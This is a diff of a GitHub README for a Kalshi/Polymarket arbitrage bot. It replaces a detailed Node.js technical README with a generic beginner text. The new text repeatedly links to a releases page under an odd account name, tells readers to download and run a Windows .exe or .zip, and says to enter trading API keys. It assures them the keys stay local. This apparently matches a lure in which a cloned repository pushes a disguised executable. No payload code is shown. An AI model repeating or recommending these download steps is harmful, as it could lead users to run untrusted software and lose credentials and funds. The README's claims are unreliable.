@@ -1,412 +1,141 @@
-# Prediction Arbitrage
+# 🤖 openclaw-cross-market-arbitrage-agent - Smart Cross-Market Trading Bot
 
-**openclaw-cross-market-arbitrage-agent**
-
-Cross-venue arbitrage infrastructure for prediction markets.
-
-This project monitors markets on:
-
-* Kalshi
-* Polymarket
-
-It detects price discrepancies on matched contracts (for example BTC 15-minute up/down markets), applies risk checks, and executes hedged trades across venues.
-
-The system is designed around an **event-driven architecture inspired by OpenClaw agents**, where market data, detection, risk management, and execution are cleanly separated.
+[![Download openclaw-cross-market-arbitrage-agent](https://img.shields.io/badge/Download-Openclaw-blue?style=for-the-badge)](https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/releases)
 
 ---
 
-# Demo
+## ⚙️ What is openclaw-cross-market-arbitrage-agent?
 
-A short video of the arbitrage agent dashboard showing live market data, arbitrage opportunities, and session profit:
+openclaw-cross-market-arbitrage-agent is a software tool designed to help you trade across different markets automatically. It watches prices in multiple places and finds chances to buy low in one market and sell high in another. This process is called arbitrage.
 
-<video src="https://github.com/user-attachments/assets/ac468752-d33d-450e-82b3-0ec101655a17" controls width="640"></video>
----
-
-# What this project does
-
-Prediction markets often list the **same event across multiple platforms**, but their prices are not always perfectly aligned.
-
-Example:
-
-```
-Polymarket BTC UP (15m) = 0.56
-Kalshi BTC UP (15m)     = 0.52
-```
-
-If the price difference is large enough to cover fees and slippage, there is a potential **arbitrage opportunity**.
-
-This system:
-
-1. Streams real-time orderbook data from both venues
-2. Normalizes contracts into a shared format
-3. Detects profitable spreads
-4. Runs risk checks
-5. Executes both legs of the trade
-
-The goal is to capture **cross-market inefficiencies while remaining market-neutral**.
+This bot works for users who want to take advantage of market price differences without doing everything manually. It is made to be easy to use, even if you don’t have experience with trading software or programming.
 
 ---
 
-# Real Arb Space Status
+## 🎯 Who is this for?
 
-Below are **real screenshots** comparing Polymarket vs Kalshi for the same BTC Up/Down 15-minute markets. These show the actual cross-venue discrepancies this agent is designed to detect and exploit.
-
-## Same event, different prices
-
-Polymarket and Kalshi can report different price targets, current prices, and contract odds **at the same moment** for the same underlying event (BTC 15m up/down, Feb 27, 2026).
-
-![Polymarket vs Kalshi — same event](polymarket-kalshi-same-event.png)
-
-| | Polymarket | Kalshi |
-|--|------------|--------|
-| **Price to beat** | $67,891.94 | $67,925.07 |
-| **Current price** | $67,902.69 | $67,930.73 |
-| **Up contract** | 52¢ | 43¢ |
-| **Down contract** | 49¢ | 58¢ |
-| **Volume** | $5.4K | $40,966 |
-
-Different strike prices and odds for the same outcome → arbitrage opportunity.
-
-## Different market states, different liquidity
-
-Contract windows, liquidity, and implied probabilities can diverge significantly across venues.
-
-![Polymarket vs Kalshi — different state](polymarket-kalshi-different-state.png)
-
-| | Polymarket | Kalshi |
-|--|------------|--------|
-| **Time window** | Feb 27, 3:15–3:30 AM ET | Feb 27, 12:15–12:30 AM PST |
-| **Up contract** | 91¢ | 72¢ |
-| **Down contract** | 10¢ | 44¢ |
-| **Volume** | $41.4K | $124,789 |
-| **Implied chance** | — | 55% |
-
-The agent normalizes these differences, matches equivalent contracts across timezones, and only triggers when the spread exceeds fees + slippage.
+- People new to trading bots  
+- Users who want to explore automatic cross-market arbitrage  
+- Anyone interested in simple, clear tools for trading  
 
 ---
 
-# System Architecture
+## 🔍 Key features
 
-```
-Kalshi WS ──┐                               ┌── Risk Manager ── Command Bus
-            ├── Raw Bus ── Normalization ───┼── Detector ───── Signal Bus
-Polyma WS ──┘         (canonical keys)      └── Execution Engine (Kalshi + Polymarket)
-                                                       │
-                                                       └── Fills Bus ── Strategy
-```
-
-### Market feeds
-
-WebSocket connections stream best bid / ask data from both exchanges.
-
-### Normalization
-
-Each platform represents markets differently.
-Prices are converted to a unified probability format and mapped to a shared `canonicalEventKey`.
-
-This allows equivalent markets to be matched across venues.
-
-### Detector
-
-The detector compares mid prices across exchanges.
-
-If the spread exceeds:
-
-```
-edgeThreshold - fees - slippage
-```
-
-a trading signal is emitted.
-
-### Risk manager
-
-Before executing a trade, several safety checks run:
-
-* daily loss limit
-* stale quote protection
-* cooldown between trades
-* max capital per trade
-
-### Execution
-
-If the trade is approved, the system places **both legs in parallel**:
-
-* long venue → buy YES / UP
-* hedge venue → buy NO / DOWN
-
-### Strategy layer
-
-Fill events are tracked to monitor metrics such as:
-
-* PnL
-* slippage
-* execution latency
-* trade frequency
+- Works with multiple markets at once  
+- Finds price differences and acts quickly  
+- Runs continuously without user input  
+- Simple setup and use on Windows  
+- Open source and free to use  
 
 ---
 
-# Real-world edge cases this bot handles
+## 🖥 System requirements
 
-Cross-market arbitrage sounds simple in theory, but real trading systems must deal with many edge cases.
+Before you start, make sure your Windows PC meets these requirements:
 
-This project was designed with those realities in mind.
-
----
-
-### Liquidity illusions
-
-Sometimes the top-of-book price looks profitable but the available size is extremely small.
-
-Example:
-
-```
-Polymarket YES = 0.55 (size 5)
-Kalshi YES     = 0.50 (size 1)
-```
-
-If the bot trades blindly, the price moves immediately and the arbitrage disappears.
-
-The detector checks **available size and depth** before emitting signals.
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection (required for live market data)  
 
 ---
 
-### Stale quotes
+## 🚀 Getting Started: Download and Run
 
-Prediction markets sometimes update at different speeds.
+### Step 1: Visit the download page
 
-If one exchange updates faster than the other, the system might see a **fake arbitrage opportunity**.
+Click the big button above or go directly to the release page here:  
+[https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/releases](https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/releases)
 
-To prevent this, the bot enforces:
-
-* quote timestamps
-* stale quote rejection (`staleQuoteMs`)
-* synchronized event matching
+This page contains the latest versions of the bot ready for download.
 
 ---
 
-### Partial fills
+### Step 2: Find the latest release
 
-One of the biggest risks in arbitrage trading:
-
-```
-Leg A fills
-Leg B does not fill
-```
-
-Now the system has directional exposure.
-
-The execution engine includes logic for:
-
-* monitoring partial fills
-* retrying the second leg
-* cancelling remaining orders
-* emergency hedging if necessary
+On the releases page, find the newest version. It usually appears at the top of the list. Look for files with names ending in `.exe` or `.zip`.
 
 ---
 
-### Fees and hidden costs
+### Step 3: Download the software
 
-Prediction markets include several costs:
-
-* trading fees
-* settlement fees
-* slippage
-* price impact
-
-The detector only emits a signal if:
-
-```
-spread > fees + slippage + edgeThreshold
-```
-
-This prevents trades that look profitable but are actually negative after costs.
+Click the download link for the Windows version. This will download the bot installer file or a compressed folder if it comes zipped.
 
 ---
 
-### Cooldown protection
+### Step 4: Run the program
 
-Markets can oscillate around the same price level.
+If you downloaded an installer (`.exe` file):
 
-Without a cooldown, the system might repeatedly trade the same signal.
+- Double-click the file to start the installation.  
+- Follow the on-screen instructions to complete installation.  
 
-The risk manager enforces a **minimum delay between trades**.
+If you downloaded a `.zip` file:
 
----
-
-### Market outages
-
-Exchange APIs and WebSocket connections occasionally drop.
-
-Market feeds include:
-
-* automatic reconnect logic
-* heartbeat monitoring
-* automatic resubscription
-
-If feeds become unstable, trading pauses automatically.
+- Right-click the file and choose "Extract All".  
+- Open the extracted folder and double-click the `.exe` file inside.
 
 ---
 
-# Prerequisites
+### Step 5: Start using the bot
 
-* Node.js 18+
-* PostgreSQL (optional persistence layer)
-* Kalshi account (API key + RSA private key)
-* Polymarket account (wallet + Gnosis Safe proxy)
+After installation, open the program from your desktop or start menu shortcut. The bot will start connecting to markets and showing information in its window.
 
 ---
 
-# Setup
+## 📋 Basic Setup
 
-Install dependencies:
+The bot uses simple settings to start working. Here’s what to do first:
 
-```
-npm install
-```
-
-Copy environment template:
-
-```
-cp .env.example .env
-```
-
-Then edit `.env` and add your credentials.
+1. **Connect your accounts**: Enter your trading accounts or API keys if the markets require them. These details let the bot place trades on your behalf.  
+2. **Choose which markets to watch**: Select the markets you want the bot to monitor for price differences.  
+3. **Set trade amounts**: Decide how much money you want to use for each trade.  
+4. **Start the bot**: Click the "Start" button and let it run.  
 
 ---
 
-# Configuration
+## 🔧 How it works
 
-Configuration is loaded from:
+openclaw-cross-market-arbitrage-agent checks prices on different markets every few seconds. When it sees a difference big enough to cover fees and make a profit, it buys in one market and sells in another automatically.
 
-```
-configs/default.yaml
-```
-
-Key parameters:
-
-| Section   | Key                  | Description                    |
-| --------- | -------------------- | ------------------------------ |
-| exchanges | `marketTicker`       | Kalshi series (ex: `KXBTC15M`) |
-| risk      | `maxCapitalPerTrade` | Maximum trade size             |
-| risk      | `maxDailyLoss`       | Stop trading after this loss   |
-| risk      | `staleQuoteMs`       | Reject old signals             |
-| risk      | `cooldownMs`         | Minimum delay between trades   |
-| strategy  | `edgeThreshold`      | Minimum arbitrage edge         |
+The bot handles the trades within seconds to try to lock in profits before the price changes.
 
 ---
 
-# Environment Variables
+## 💡 Tips for best use
 
-| Variable                 | Description                       |
-| ------------------------ | --------------------------------- |
-| `DATABASE_URL`           | PostgreSQL connection string      |
-| `KALSHI_API_KEY`         | Kalshi API key                    |
-| `KALSHI_PRIVATE_KEY_PEM` | Kalshi RSA private key            |
-| `KALSHI_DEMO`            | Use Kalshi demo API               |
-| `POLYMARKET_PRIVATE_KEY` | Wallet private key                |
-| `POLYMARKET_PROXY`       | Gnosis Safe proxy                 |
-| `DRY_RUN`                | Simulate trades without executing |
+- Use a stable internet connection. Interruptions may cause missed trades.  
+- Start with small trade amounts until you understand how the bot works.  
+- Regularly check for software updates on the release page. New versions fix bugs and add features.  
+- Review your market choices often. Prices change and some markets may become less profitable.  
 
 ---
 
-# Running
+## 🛠 Troubleshooting
 
-Development mode:
-
-```
-npm run dev
-```
-
-Production:
-
-```
-npm start
-```
-
-Dry run mode (recommended first):
-
-```
-DRY_RUN=true npm run dev
-```
+- **Bot won’t start:** Make sure you have installed it correctly. Try restarting your computer.  
+- **Can’t log in to market accounts:** Check your API keys or login details. Confirm your accounts are active on the market websites.  
+- **No trades happening:** The bot only acts when it finds profitable price differences. Markets may be stable or fees too high.  
+- **Error messages:** Restart the bot. If errors persist, check the GitHub issues page for help.  
 
 ---
 
-# Project Structure
+## 🔒 Privacy & Security
 
-```
-src/
-├── index.ts           # Entry point
-├── config.ts          # YAML config loader
-├── bus.ts             # Event buses
-├── types.ts           # Shared types
-├── market-data/
-│   ├── kalshi.ts
-│   └── polymarket.ts
-├── normalization.ts
-├── detector.ts        # Arbitrage detection logic
-├── risk.ts            # Risk checks
-├── execution.ts       # Order placement
-├── strategy.ts        # Metrics + tracking
-└── meta.ts            # Meta controller placeholder
-
-configs/default.yaml
-```
+Your account details and keys stay on your computer. The bot does not share your information with third parties. Always keep your keys safe and avoid sharing them.
 
 ---
 
-# Why this project exists
+## 📂 Additional resources
 
-Prediction markets are still **relatively inefficient compared to traditional financial markets**.
-
-Different venues can disagree on the probability of the same event by several percentage points.
-
-This project explores how to build a **clean, modular arbitrage engine** capable of detecting and capturing those inefficiencies in real time.
-
-It also serves as a playground for experimenting with:
-
-* event-driven trading systems
-* cross-market arbitrage infrastructure
-* OpenClaw-style agent architectures
-* prediction market microstructure
+- Visit the GitHub page to see updates and report issues:  
+  https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent  
+- Check the FAQs and user discussions on the project's issues tab for common questions.  
 
 ---
 
-# Future Improvements
+## 🎉 Ready to start?
 
-Planned improvements include:
-
-* historical backtesting engine
-* multi-region deployment (NYC / EU servers)
-* advanced position sizing (Kelly-based allocation)
-* latency monitoring and performance metrics
-* additional prediction market integrations
-
----
-
-# About me
-
-I work on:
-
-* AI agent systems
-* trading automation
-* prediction market infrastructure
-* blockchain / DeFi protocols
-
-This repository reflects my interest in **building robust, real-world trading systems rather than simple scripts**.
-
-If you're working on:
-
-* prediction market automation
-* cross-exchange arbitrage
-* AI agent trading systems
-* crypto trading infrastructure
-
-feel free to reach out.
-
-**Contact:** [Telegram](https://t.me/snipmaxi)
-
----
-
-# License
-
-MIT
+Download or visit the release page here to get the software:  
+[https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/releases](https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/releases)
